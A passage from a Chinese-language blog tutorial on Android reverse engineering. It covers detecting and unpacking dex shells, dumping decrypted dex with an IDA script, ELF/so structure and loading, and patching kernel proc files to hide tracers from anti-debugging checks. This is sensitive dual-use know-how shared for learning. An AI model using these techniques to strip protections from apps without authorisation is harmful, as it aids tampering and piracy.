changeMethod2&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在 app 下的 build.gradle 中修改以强制转换指针：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ...</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        ...</span><br><span class="line">        externalNativeBuild &#123;</span><br><span class="line">            cmake &#123;</span><br><span class="line">                cppFlags &quot;-fpermissive&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TODO:</p><h1 id="DVM-脱壳"><a href="#DVM-脱壳" class="headerlink" title="DVM 脱壳"></a>DVM 脱壳</h1><p>目前存在对 apk 中的 classes.dex 进行加密的技术，称为加壳。通过对 dex 文件的加壳，可以达到减少体积，隐藏真实代码的效果。Android 的壳与 PE 文件一样，在程序运行时，先到达壳的入口点，运行解壳代码，然后再到达程序入口点并运行代码。如果要脱壳，就需要在程序解码完毕并到达程序真实入口点中间某个位置，把原始的 dex 代码给 dump 下来，还原到 apk 文件中。</p><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>壳入口：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:name</span>=<span class="string">"com.ali.mobisecenhance.SubApplication"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>程序入口：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.ali.encryption.MainActivity"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="assets-分析"><a href="#assets-分析" class="headerlink" title="assets 分析"></a>assets 分析</h2><p>assets 中一般存储着加密过的 dex，以及解密用的 so 等信息，因此先分析 assets 可以有效获取程序解壳思路。</p><h2 id="ProxyApplication-分析"><a href="#ProxyApplication-分析" class="headerlink" title="ProxyApplication 分析"></a>ProxyApplication 分析</h2><h2 id="壳代码分析"><a href="#壳代码分析" class="headerlink" title="壳代码分析"></a>壳代码分析</h2><p>壳代码中 Java 层转 Native 层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">attachBaseContext</span><span class="params">(Context arg1)</span> </span>&#123;&#125; <span class="comment">// 还原代码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;&#125; <span class="comment">// 执行原始代码</span></span><br></pre></td></tr></table></figure><h2 id="so-文件分析"><a href="#so-文件分析" class="headerlink" title="so 文件分析"></a>so 文件分析</h2><p>带压缩的，一般用 libz 中的 uncompress 函数进行解码，可以用该函数进行快速定位。</p><h2 id="IDA-中-dump-数据"><a href="#IDA-中-dump-数据" class="headerlink" title="IDA 中 dump 数据"></a>IDA 中 dump 数据</h2><p>在 Native 层中解密 dex 数据并还原后，替换为原始 Application。IDC Dump 脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> fp, begin, end, len, b;</span><br><span class="line">    fp = fopen(<span class="string">"dump.data"</span>, <span class="string">"wb"</span>);</span><br><span class="line">    begin = <span class="number">0x544D2008</span>; <span class="comment">// 解密后数据在内存中的位置</span></span><br><span class="line">    len = <span class="number">0x019CF4</span>; <span class="comment">// 文件大小</span></span><br><span class="line">    end = begin + len;</span><br><span class="line">    <span class="keyword">for</span> (b = begin; b &lt; end; b++) &#123;</span><br><span class="line">        fputc(Byte(b), fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dex-加载流程"><a href="#Dex-加载流程" class="headerlink" title="Dex 加载流程"></a>Dex 加载流程</h2><p>vm-&gt;native-&gt;dalvik_systm_DexFile-&gt;openDexFile，读取内存中的 Dex 文件数据，并加载 Dalvik_dalvik_system_DexFile_openDexFile_bytearray。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转换存储的dex格式为可执行的dex格式</span></span><br><span class="line">dvmRawDexFileOpenArray(pBytes, length, &amp;pRawDexFile);</span><br><span class="line"><span class="comment">// 添加到gDvm中</span></span><br><span class="line">addToDexFileTable(pDexOrJar);</span><br></pre></td></tr></table></figure><p>壳实现加载流程：</p><ol><li>内存中解密 dex 函数</li><li>将 dex 存储结构转换为可执行结构</li><li>添加到 gDvm 中（有些壳是自己实现了这个功能，有些是调用了系统的函数）</li><li>抹去 dex 存储结构中的有效数据</li></ol><h2 id="内存-dex-定位"><a href="#内存-dex-定位" class="headerlink" title="内存 dex 定位"></a>内存 dex 定位</h2><p>gDvm.userDexFiles 是存放 dex cookie（dexOfJar 结构）的地方，因此可以通过遍历该数据结构来获得每个 dex 文件的起始地址。</p><p>Dex 重构：通过分析内存中的 dex 存储结构，完成对整个 dex 文件的 dump。</p><p>Dex 转 Odex：优化 vm\analysis\Optimize.cpp-&gt;dvmOptimizeClass</p><p>Dex 校验：vm\analysis\DexVerify.cpp-&gt;dvmVerifyClass</p><p>取消非必要优化与校验：\system\build.prop =&gt; Dalvik.vm.dexopt-flag=v=n,o=n</p><h1 id="ELF-文件简介（ARM-架构下的-ELF）"><a href="#ELF-文件简介（ARM-架构下的-ELF）" class="headerlink" title="ELF 文件简介（ARM 架构下的 ELF）"></a>ELF 文件简介（ARM 架构下的 ELF）</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>ELF 在加载前和加载后的文件格式是完全不同的，给加密提供了方便。</p><p><img src="/pics/Android逆向入门/四/4.png" alt="ELF在加载前和加载后的视图"></p><p>链接执行时，Section Header 中的表将会被映射到 Program Header 中，里面的 ELF Header、Program Header 和 Section header 非常重要，Linker 会根据这三个头信息进行 so 文件加载。</p><p>PS：如何从内存中 dump 下 so 文件？开启 IDA 动态调试，在 Module 窗口中找到对应的 so 文件，根据 so 文件的起始地址和文件大小，使用 IDC 脚本 dump 下来。</p><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><p>存储 so 文件最为基本的信息，如 so 运行的 CPU 平台、Program Header 数量、Section Header 数量等，重要性等同于 Dex Header。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h libxtian.so</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">'s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              DYN (Shared object file)</span></span><br><span class="line"><span class="string">  Machine:                           ARM</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x0</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          117240 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x5000200, Version5 EABI, soft-float ABI</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         8</span></span><br><span class="line"><span class="string">  Size of section headers:           40 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         25</span></span><br><span class="line"><span class="string">  Section header string table index: 24</span></span><br></pre></td></tr></table></figure><h3 id="Section-Header"><a href="#Section-Header" class="headerlink" title="Section Header"></a>Section Header</h3><p>存储 so 的链接用信息，主要是用于给外部程序详细地提供本 so 的信息，比如第几行对应哪个函数、什么名字、对应着源码的什么位置等等。IDA 就是通过读取该头信息进行 so 分析的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S libxtian.so</span><br><span class="line">There are 25 section headers, starting at offset 0x1c9f8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .note.gnu.build-i NOTE            00000134 000134 000024 00   A  0   0  4</span><br><span class="line">  [ 2] .dynsym           DYNSYM          00000158 000158 000570 10   A  3   1  4</span><br><span class="line">  [ 3] .dynstr           STRTAB          000006c8 0006c8 00034e 00   A  0   0  1</span><br><span class="line">  [ 4] .<span class="built_in">hash</span>             HASH            00000a18 000a18 000270 04   A  2   0  4</span><br><span class="line">  [ 5] .gnu.version      VERSYM          00000c88 000c88 0000ae 02   A  2   0  2</span><br><span class="line">  [ 6] .gnu.version_d    VERDEF          00000d38 000d38 00001c 00   A  3   1  4</span><br><span class="line">  [ 7] .gnu.version_r    VERNEED         00000d54 000d54 000020 00   A  3   1  4</span><br><span class="line">  [ 8] .rel.dyn          REL             00000d74 000d74 0050f8 08   A  2   0  4</span><br><span class="line">  [ 9] .rel.plt          REL             00005e6c 005e6c 0000a0 08  AI  2  10  4</span><br><span class="line">  [10] .plt              PROGBITS        00005f0c 005f0c 000104 00  AX  0   0  4</span><br><span class="line">  [11] .text             PROGBITS        00006010 006010 013684 00  AX  0   0  4</span><br><span class="line">  [12] .ARM.extab        PROGBITS        00019694 019694 0001a4 00   A  0   0  4</span><br><span class="line">  [13] .ARM.exidx        ARM_EXIDX       00019838 019838 000250 08  AL 11   0  4</span><br><span class="line">  [14] .rodata           PROGBITS        00019a90 019a90 0002d0 00   A  0   0 16</span><br><span class="line">  [15] .fini_array       FINI_ARRAY      0001ad64 019d64 000008 00  WA  0   0  4</span><br><span class="line">  [16] .init_array       INIT_ARRAY      0001ad6c 019d6c 000004 00  WA  0   0  1</span><br><span class="line">  [17] .dynamic          DYNAMIC         0001ad70 019d70 000120 08  WA  3   0  4</span><br><span class="line">  [18] .got              PROGBITS        0001ae90 019e90 000170 00  WA  0   0  4</span><br><span class="line">  [19] .data             PROGBITS        0001b000 01a000 002870 00  WA  0   0 16</span><br><span class="line">  [20] .bss              NOBITS          0001d870 01c870 0001d8 00  WA  0   0  4</span><br><span class="line">  [21] .comment          PROGBITS        00000000 01c870 00003d 01  MS  0   0  1</span><br><span class="line">  [22] .note.gnu.gold-ve NOTE            00000000 01c8b0 00001c 00      0   0  4</span><br><span class="line">  [23] .ARM.attributes   ARM_ATTRIBUTES  00000000 01c8cc 000036 00      0   0  1</span><br><span class="line">  [24] .shstrtab         STRTAB          00000000 01c902 0000f6 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h3 id="Program-Header"><a href="#Program-Header" class="headerlink" title="Program Header"></a>Program Header</h3><p>存储 so 文件运行时需要的信息。该信息会直接被 Linker 所使用，运用于 so 加载。因此这个 Header 的数据是肯定可信的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l libxtian.so</span><br><span class="line"></span><br><span class="line">Elf file <span class="built_in">type</span> is DYN (Shared object file)</span><br><span class="line">Entry point 0x0</span><br><span class="line">There are 8 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4</span><br><span class="line">  LOAD           0x000000 0x00000000 0x00000000 0x19d60 0x19d60 R E 0x1000</span><br><span class="line">  LOAD           0x019d64 0x0001ad64 0x0001ad64 0x02b0c 0x02ce4 RW  0x1000</span><br><span class="line">  DYNAMIC        0x019d70 0x0001ad70 0x0001ad70 0x00120 0x00120 RW  0x4</span><br><span class="line">  NOTE           0x000134 0x00000134 0x00000134 0x00024 0x00024 R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0</span><br><span class="line">  EXIDX          0x019838 0x00019838 0x00019838 0x00250 0x00250 R   0x4</span><br><span class="line">  GNU_RELRO      0x019d64 0x0001ad64 0x0001ad64 0x0029c 0x0029c RW  0x4</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00</span><br><span class="line">   01     .note.gnu.build-id .dynsym .dynstr .<span class="built_in">hash</span> .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.extab .ARM.exidx .rodata</span><br><span class="line">   02     .fini_array .init_array .dynamic .got .data .bss</span><br><span class="line">   03     .dynamic</span><br><span class="line">   04     .note.gnu.build-id</span><br><span class="line">   05</span><br><span class="line">   06     .ARM.exidx</span><br><span class="line">   07     .fini_array .init_array .dynamic .got</span><br></pre></td></tr></table></figure><h2 id="加载-so-的流程"><a href="#加载-so-的流程" class="headerlink" title="加载 so 的流程"></a>加载 so 的流程</h2><p>Android 上的 ELF 文件是通过 Linker（位于 Bionic/Linker）加载到内存中并进行执行的。所以通过研究 Linker 可以清楚地知道 Android 系统到底使用了到了 so 的哪些数据。Linker 启动时会先对自身的函数表数据等进行重定位，然后再对其他 so 文件进行定位。</p><p>Linkere 加载中只会用到 Program Header（甚至直接删除 Section Header 也是可以的）。Program Header 解析：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">link.cpp -&gt; <span class="function">soinfo *<span class="title">do_dlopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> flags)</span> <span class="comment">// so加载</span></span></span><br><span class="line"><span class="function"><span class="title">find_library</span><span class="params">(name)</span></span>;</span><br><span class="line">si-&gt;CallConstructors();</span><br><span class="line">CallFunction(<span class="string">"DT_INIT"</span>, init_func); <span class="comment">// so脱壳点</span></span><br><span class="line">CallArray(<span class="string">"DT_INIT_ARRAY"</span>, init_array, init_array_count, <span class="literal">false</span>); <span class="comment">// dex脱壳点</span></span><br></pre></td></tr></table></figure><p>加载 so 的时候，有两种加载方式，一个是直接 load，还有一个是 loadLibrary。无论是哪种方式，都会先获取 ClassLoader，然后再调用相应的方法。当传进来的 loader 不为空，则会调用 findLibrary 方法，然后执行 doLoad 方法，如果 loader 为空，则会执行另一个流程，但是后面也会执行 doLoad 方法。</p><h2 id="ELF-文件变形与保护（阻碍分析）"><a href="#ELF-文件变形与保护（阻碍分析）" class="headerlink" title="ELF 文件变形与保护（阻碍分析）"></a>ELF 文件变形与保护（阻碍分析）</h2><ul><li>Section 段处理：鉴于 Section Header 没有被 Linker 用于加载，所以可以对 Section 段写入无用数据，可以阻碍静态分析软件的分析。</li><li>Program 段处理：Program 段中可以对 DYNAMIC 区段进行混淆，添加重复的数据以及无效的数据。</li></ul><h1 id="so-文件加壳修复"><a href="#so-文件加壳修复" class="headerlink" title="so 文件加壳修复"></a>so 文件加壳修复</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  EXIDX          0x02867c 0x0002867c 0x0002867c 0x00568 0x00568 R   0x4</span><br><span class="line">  LOAD           0x000000 0x00000000 0x00000000 0x13294 0x13294 R E 0x8000</span><br><span class="line">  LOAD           0x018c10 0x00030c10 0x00030c10 0x0052c 0x01548 RW  0x8000</span><br><span class="line">  DYNAMIC        0x018c74 0x00030c74 0x00030c74 0x00108 0x00108 RW  0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</span><br><span class="line">  GNU_RELRO      0x018c10 0x00030c10 0x00030c10 0x003f0 0x003f0 R   0x1</span><br></pre></td></tr></table></figure><p>加过壳的标志：<code>FileSiz!=MemSiz</code>，明显存在加载后在内存进行解码的可能。函数地址也在文件之外。</p><p>修复：dump 内存，数据对齐重定位。</p><h1 id="Android-源码定制添加反反调试基址"><a href="#Android-源码定制添加反反调试基址" class="headerlink" title="Android 源码定制添加反反调试基址"></a>Android 源码定制添加反反调试基址</h1><p>反调试一般会检测 proc 下是否有 status/stat 文件。首先修改 kernel 源码中的 <code>fs/proc/base.c</code>。修改 proc_pid_wchan 函数的返回值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">proc_pid_wchan</span><span class="params">(struct task_struct *task, <span class="keyword">char</span> *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> wchan;</span><br><span class="line">        <span class="keyword">char</span> symname[KSYM_NAME_LEN];</span><br><span class="line"></span><br><span class="line">        wchan = get_wchan(task);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lookup_symbol_name(wchan, symname) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">if</span> (!ptrace_may_access(task, PTRACE_MODE_READ))</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">sprintf</span>(buffer, <span class="string">"%lu"</span>, wchan);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strstr</span>(symname, <span class="string">"trace"</span>)) &#123; <span class="comment">// 检测进程中是否有trace这个字符串</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">sprintf</span>(buffer, <span class="string">"%s"</span>, <span class="string">"sys_epoll_wait"</span>); <span class="comment">// sys_epoll_wait用来获取文件状态已经就绪的事件</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">sprintf</span>(buffer, <span class="string">"%s"</span>, symname);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是 <code>fs/proc/array.c</code> 文件，分别修改 tast_state 函数和 task_state_array 变量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">task_state</span><span class="params">(struct seq_file *m, struct pid_namespace *ns,</span></span></span><br><span class="line"><span class="function"><span class="params">                                struct pid *pid, struct task_struct *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">        <span class="keyword">int</span> g;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">NULL</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">        <span class="keyword">pid_t</span> ppid, tpid;</span><br><span class="line"></span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        ppid = pid_alive(p) ?</span><br><span class="line">                task_tgid_nr_ns(rcu_dereference(p-&gt;real_parent), ns) : <span class="number">0</span>;</span><br><span class="line">        tpid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (pid_alive(p)) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tracer</span> = <span class="title">ptrace_parent</span>(<span class="title">p</span>);</span></span><br><span class="line">                <span class="keyword">if</span> (tracer)</span><br><span class="line">                        tpid = task_pid_nr_ns(tracer, ns);</span><br><span class="line">        &#125;</span><br><span class="line">        cred = get_task_cred(p);</span><br><span class="line">        seq_printf(m,</span><br><span class="line">                <span class="string">"State:\t%s\n"</span></span><br><span class="line">                <span class="string">"Tgid:\t%d\n"</span></span><br><span class="line">                <span class="string">"Pid:\t%d\n"</span></span><br><span class="line">                <span class="string">"PPid:\t%d\n"</span></span><br><span class="line">                <span class="string">"TracerPid:\t%d\n"</span></span><br><span class="line">                <span class="string">"Uid:\t%d\t%d\t%d\t%d\n"</span></span><br><span class="line">                <span class="string">"Gid:\t%d\t%d\t%d\t%d\n"</span>,</span><br><span class="line">                get_task_state(p),</span><br><span class="line">                task_tgid_nr_ns(p, ns),</span><br><span class="line">                pid_nr_ns(pid, ns),</span><br><span class="line">                ppid, <span class="number">0</span>, <span class="comment">// 把tpid修改为0</span></span><br><span class="line">                cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,</span><br><span class="line">                cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</span><br><span class="line"></span><br><span class="line">        task_lock(p);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;files)</span><br><span class="line">                fdt = files_fdtable(p-&gt;files);</span><br><span class="line">        seq_printf(m,</span><br><span class="line">                <span class="string">"FDSize:\t%d\n"</span></span><br><span class="line">                <span class="string">"Groups:\t"</span>,</span><br><span class="line">                fdt ? fdt-&gt;max_fds : <span class="number">0</span>);</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">        group_info = cred-&gt;group_info;</span><br><span class="line">        task_unlock(p);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (g = <span class="number">0</span>; g &lt; min(group_info-&gt;ngroups, NGROUPS_SMALL); g++)</span><br><span class="line">                seq_printf(m, <span class="string">"%d "</span>, GROUP_AT(group_info, g));</span><br><span class="line">        put_cred(cred);</span><br><span class="line"></span><br><span class="line">        seq_putc(m, <span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> task_state_array[] = &#123;</span><br><span class="line">        <span class="string">"R (running)"</span>,          <span class="comment">/*   0 */</span></span><br><span class="line">        <span class="string">"S (sleeping)"</span>,         <span class="comment">/*   1 */</span></span><br><span class="line">        <span class="string">"D (disk sleep)"</span>,       <span class="comment">/*   2 */</span></span><br><span class="line">        <span class="string">"S (sleeping)"</span>,         <span class="comment">// "T (stopped)",          /*   4 */</span></span><br><span class="line">        <span class="string">"S (sleeping)"</span>,         <span class="comment">// "t (tracing stop)",     /*   8 */</span></span><br><span class="line">        <span class="string">"Z (zombie)"</span>,           <span class="comment">/*  16 */</span></span><br><span class="line">        <span class="string">"X (dead)"</span>,             <span class="comment">/*  32 */</span></span><br><span class="line">        <span class="string">"x (dead)"</span>,             <span class="comment">/*  64 */</span></span><br><span class="line">        <span class="string">"K (wakekill)"</span>,         <span class="comment">/* 128 */</span></span><br><span class="line">        <span class="string">"W (waking)"</span>,           <span class="comment">/* 256 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后可以根据<a href="https://se8s0n.github.io/2019/04/19/%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87TracePID%E5%8F%8D%E8%B0%83%E8%AF%95%E4%BA%8C%E2%80%94%E2%80%94%E4%BB%8E%E6%BA%90%E7%A0%81%E5%85%A5%E6%89%8B/" target="_blank" rel="noopener">这篇文章</a>把 boot.img 重新打包并刷入手机。</p><h1 id="Refereences"><a href="#Refereences" class="headerlink" title="Refereences"></a>Refereences</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://www.jianshu.com/p/f7f0a712ddfe" target="_blank" rel="noopener">https://www.jianshu.com/p/f7f0a712ddfe</a><br><a href="https://source.android.com/devices/tech/dalvik/dex-format.html" target="_blank" rel="noopener">https://source.android.com/devices/tech/dalvik/dex-format.html</a><br><a href="https://www.jianshu.com/p/f7f0a712ddfe" target="_blank" rel="noopener">https://www.jianshu.com/p/f7f0a712ddfe</a><br><a href="http://gnaixx.cc/2016/11/26/20161126dex-file/" target="_blank" rel="noopener">http://gnaixx.cc/2016/11/26/20161126dex-file/</a><br><a href="https://www.cnblogs.com/stars-one/p/8890162.html" target="_blank" rel="noopener">https://www.cnblogs.com/stars-one/p/8890162.html</a><br><a href="http://shxi.me/posts/7b82cd68.html" target="_blank" rel="noopener">http://shxi.me/posts/7b82cd68.html</a></p>]]></content>
    
    <summary type="html">
    
